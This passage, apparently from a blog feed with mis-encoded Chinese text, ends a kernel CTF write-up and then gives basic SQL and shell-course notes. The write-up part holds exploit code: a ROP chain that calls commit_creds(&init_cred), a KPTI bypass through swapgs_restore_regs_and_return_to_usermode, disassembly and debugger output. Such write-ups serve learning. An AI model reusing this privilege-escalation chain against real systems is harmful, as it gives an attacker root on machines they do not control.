rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// è¿™é‡Œå‡å®šé€šè¿‡ seq_operations-&gt;stat æ¥è§¦å‘</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    exploit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>cr3 bypass kptiï¼Œåœ¨é«˜ç‰ˆæœ¬ä½¿ç”¨ï¼Œåœ¨ <code>+22</code> åœ°å€æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„gadgetã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure><ul><li>çœ‹åˆ«äººçš„åšæ³•ï¼Œå¥½åƒä¸éœ€è¦å…³æ³¨ripåé¢çš„å†…å®¹ï¼Œä½†æ˜¯æœ¬é¢˜æˆ‘æ²¡æœ‰ä½¿ç”¨è¿™ç§æ–¹å¼åšå‡ºæ¥ ğŸ‘€ã€‚</li><li>æœ€åéœ€è¦æˆ‘ä»¬è°ƒç”¨getshellå‡½æ•°ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   __asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">       <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   swapgs_restore_regs_and_return_to_usermode + 22;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>    </span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">get_shell();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ul><li><p>commit_creds(prepare_kernel_cred (0)) &#x3D;&gt; ç®€åŒ–ä¸º commit_creds(&amp;init_cred) init_cred: init è¿›ç¨‹çš„æƒé™ï¼Œä¸ºrootï¼Œåœ¨ <code>/proc/kallsyms</code> å†…</p></li><li><p>å¯»æ‰¾ gadget æ—¶å¯èƒ½å¯»æ‰¾åˆ°çš„gadgetä¸èƒ½ä½¿ç”¨ï¼ŒæŠ¥é”™ä¸º <code>kernel tried to execute NX-protected page</code>ï¼Œè¯´æ˜å…¶åœ°å€ä¸å¯è®¿é—®ï¼Ÿé‚£å°±åªèƒ½æ¢äº†</p></li><li><p>ä¸ºä»€ä¹ˆæ‰¾ä¸å¯¹gadget?æˆ–è€…æ ¹æœ¬æ²¡æœ‰æ‰¾åˆ°ğŸ¤¡ã€‚å’Œå‚è€ƒçš„çœ‹çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°gadgetåœ°å€æ ¹æœ¬å°±æ²¡æ‰¾å¯¹ã€‚</p><ul><li>ropper + ROPgadget + ropr ä¸‰ä¸ªå·¥å…·ä¸€èµ·ä½¿ç”¨ï¼Œè·å¾—ä¸‰ä¸ªgadgetæ–‡ä»¶ã€‚</li><li>extract-vmlinux + vmlinux-to-elf å·¥å…·</li></ul></li><li><p>å¦‚ä½•ä¸‹æ–­ç‚¹ï¼Ÿ</p><ul><li>åœ¨æƒ³æš‚åœçš„çš„åœ°æ–¹ä½¿ç”¨ <code>getchar()</code> åœæ­¢åä¸€è·¯si</li><li>åœ¨å›ºå®šçš„æŒ‡ä»¤åœ°å€ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯éœ€è¦äº‹å…ˆçŸ¥é“åœ°å€ã€‚ä½†æ˜¯ropæ—¶ï¼Œåœ°å€ä¸€èˆ¬éƒ½æ˜¯çŸ¥é“çš„ã€‚</li></ul></li><li><p>åœ¨å›ºå®šçš„æŒ‡ä»¤ä¸‹æ–­ç‚¹ï¼Œæ¯”å¦‚æ­¤é¢˜å°±å¯ä»¥åœ¨åœ¨ add rsp é‚£ä¸€æ¡æŒ‡ä»¤ä¸‹æ–­ç‚¹</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffff81909b8c    add    rsp, module_ioctl+56          &lt;0x168&gt;</span><br><span class="line">   0xffffffff81909b93    ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0xffffc900001c7df8+0x168 </span><br><span class="line">00:0000 0xffffc900001c7f60 0x44444444 /* <span class="string">&#x27;DDDD&#x27;</span> */</span><br><span class="line">01:0008 0xffffc900001c7f68 0x33333333 /* <span class="string">&#x27;3333&#x27;</span> */</span><br><span class="line">02:0010 0xffffc900001c7f70 0x22222222 /* <span class="string">&#x27;&quot;&quot;&quot;&quot;&#x27;</span> */</span><br><span class="line">03:0018 0xffffc900001c7f78 0xbbbb1111</span><br><span class="line">04:0020 0xffffc900001c7f80 0xbbbb2222</span><br><span class="line">05:0028 0xffffc900001c7f88 0x246</span><br><span class="line">06:0030 0xffffc900001c7f90 0x11110000</span><br><span class="line">07:0038 0xffffc900001c7f98 0x99999999</span><br><span class="line">08:0040 0xffffc900001c7fa0 0x88888888</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸ç”¨æ•°æ®åº“åŸºæœ¬è¯­æ³•</title>
      <link href="/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç®€å•å­¦ä¹ å¢åˆ æ”¹æŸ¥</p></blockquote><span id="more"></span><ul><li><p>ä¸‰ä¸ªæœ€å¹¿æ³›ä½¿ç”¨çš„å¼€æº RDBMSï¼šSQLiteã€MySQL å’Œ PostgreSQLã€‚å…³ç³»å‹æ•°æ®åº“</p></li><li><p>å› ä¸ºSQLçš„æ ‡å‡†ï¼Œä¸‰ä¸ªæ•°æ®åº“å·®ä¸å¤šçš„è¯­æ³•ã€‚</p></li></ul><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><blockquote><p>å…¶å®æ˜¯å¼€æº MariaDB</p></blockquote><ul><li>æ•°æ®åº“</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥çœ‹</span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¿æ¥</span></span><br><span class="line">use database_name;</span><br></pre></td></tr></table></figure><ul><li>è¡¨</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">column_name data_type å±æ€§ </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥è¯¢</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å¢åŠ </span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><ul><li><p>æ•°æ®ç±»å‹</p></li><li><p>æŸ¥è¯¢é™å®š</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ’åº</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å±æ€§é™å®š</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ç»“æœä¸ªæ•°</span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><ul><li>æ•°æ®åº“</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥çœ‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¿æ¥</span></span><br></pre></td></tr></table></figure><ul><li>è¡¨</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">column_name data_type å±æ€§ </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥è¯¢</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å¢åŠ </span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ’åº</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å»é‡</span></span><br><span class="line"><span class="keyword">distinct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å±æ€§é™å®š</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br></pre></td></tr></table></figure><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><ul><li><p>sqlite3</p></li><li><p>å‘½ä»¤</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.help;     -- å¸®åŠ©ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">.open test.db;  -- æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»º</span><br><span class="line"></span><br><span class="line">.show;     -- æ˜¾ç¤ºä¸€ç³»åˆ—å±æ€§</span><br><span class="line"></span><br><span class="line">.quit   -- é€€å‡º</span><br><span class="line"></span><br><span class="line">.databases  -- æ˜¾ç¤ºæ•°æ®åº“</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºæ•°æ®åº“</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- è¯»å–æˆ–è€…åˆ›å»º</span><br><span class="line">sqlite3 name</span><br><span class="line">.open name</span><br></pre></td></tr></table></figure><ul><li>å¯¼å…¥å¯¼å‡ºæ•°æ®åº“</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dump   -- å°†æ•°æ®åº“å¯¼å‡ºSQL æ–‡ä»¶ </span><br><span class="line">sqlite3 test.db .dump &gt; test.sql</span><br><span class="line">sqlite3 test.db &lt; test.db</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºè¡¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.tables  -- æ˜¾ç¤ºè¡¨</span><br><span class="line">.schema  -- è¡¨çš„ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">CREATE TABLE table_name (</span><br><span class="line">column_name type primary key</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DROP TABLE database.table_name;</span><br><span class="line"></span><br><span class="line">INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;)</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- è¿˜æ˜¯SELECT è¯­å¥</span><br></pre></td></tr></table></figure><h1 id="ç¼–ç¨‹æ“ä½œ"><a href="#ç¼–ç¨‹æ“ä½œ" class="headerlink" title="ç¼–ç¨‹æ“ä½œ"></a>ç¼–ç¨‹æ“ä½œ</h1><ul><li>ä½¿ç”¨Cè¯­è¨€æ“ä½œæ•°æ®åº“ï¼Œå…¶ä½™ç¼–ç¨‹è¯­è¨€æ“ä½œæ•°æ®åº“ä¹Ÿå·®ä¸å¤šï¼Œä¸»è¦æ˜¯å†™SQLè¯­å¥çš„æ“ä½œã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºæ•™è‚²ç¼ºå¤±çš„ä¸€è¯¾</title>
      <link href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/"/>
      <url>/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>the Missing Semester of your CS education</p></blockquote><span id="more"></span><ul><li><p>The Missing Semester of your CS educationï¼Œå…±<code>11</code>èŠ‚è¯¾ï¼Œæ¯èŠ‚è¯¾çº¦1hã€‚</p><ul><li><a href="https://www.bilibili.com/video/BV1uc411N7eK/?spm_id_from=333.999.0.0&vd_source=ccaa27461534d3a4a5e9b964672f86d6">bilibili åŒè¯­å­—å¹•</a></li><li><a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Missing Semester IAP 2020</a></li></ul></li><li><p>ç¡®å®ä¸é”™ï¼Œæ‰‹æ•²å‘½ä»¤+è®²è§£ã€‚å¤šä½¿ç”¨Linux</p></li><li><p>å­¦æ ¡åº”è¯¥åœ¨å¤§ä¸€æ•™è¿™ä¸ªï¼Œè€Œä¸æ˜¯TMçš„å¤§å­¦ç‰©ç†</p></li><li><p>è¯¾ç¨‹ç½‘ç«™</p></li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://missing.csail.mit.edu/</span><br></pre></td></tr></table></figure><h2 id="lectrue1-overview-shell"><a href="#lectrue1-overview-shell" class="headerlink" title="lectrue1: overview &amp; shell"></a>lectrue1: overview &amp; shell</h2><blockquote><p>ä¸»è¦æ˜¯ Linux åŸºæœ¬å‘½ä»¤</p></blockquote><h3 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h3><ul><li>å¦‚ä½•åˆ©ç”¨å­˜åœ¨çš„å·¥å…·ä½¿æˆ‘ä»¬å¼€å‘æ›´åŠ é«˜æ•ˆï¼Œä»¥åŠå¦‚ä½•æ›´å¥½çš„åˆ©ç”¨æˆ‘ä»¬çš„è®¡ç®—æœºï¼Œè¿™æ˜¯è¿™é—¨è¯¾ä¸»è¦è§£å†³çš„é—®é¢˜ã€‚</li></ul><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><ul><li>è®²è¿°äº†Linux Shell.ä¸»è¦æ˜¯bash</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellæ˜¯è¿è¡Œåœ¨ç»ˆç«¯ä¸­çš„æ–‡æœ¬äº’åŠ¨ç¨‹åºï¼Œbashï¼ˆGNU Bourne-Again Shellï¼‰æ˜¯æœ€å¸¸ç”¨çš„ä¸€ç§shellã€‚æ˜¯å½“å‰å¤§å¤šæ•°Linuxå‘è¡Œç‰ˆçš„é»˜è®¤Shellã€‚</span><br></pre></td></tr></table></figure><ul><li>æ—¥æœŸ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br></pre></td></tr></table></figure><ul><li>æ‰“å°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure><ul><li>è·¯å¾„åˆ—è¡¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å½“æˆ‘ä»¬æ‰§è¡Œä¸€äº›å‘½ä»¤æ—¶ï¼Œä¼šéå†PATHå¯»æ‰¾ï¼›æ¯”å¦‚è¯´ä½¿ç”¨ /bin/echo æ—¶åªéœ€åœ¨ç»ˆç«¯è¾“å…¥ echo å°±è¡Œ</span></span><br><span class="line"><span class="comment"># `:` åˆ†éš”</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><ul><li>å¯»æ‰¾å‘½ä»¤çš„è·¯å¾„</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> <span class="built_in">echo</span></span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="comment"># whereiså¯ä»¥å¯»æ‰¾åˆ° åŸå§‹ä»£ç ã€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–æ˜¯å¸®åŠ©æ–‡ä»¶</span></span><br><span class="line">$ whereis bash</span><br><span class="line">bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz</span><br></pre></td></tr></table></figure><ul><li>ç›®å½•</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change dir</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/username</span><br><span class="line"></span><br><span 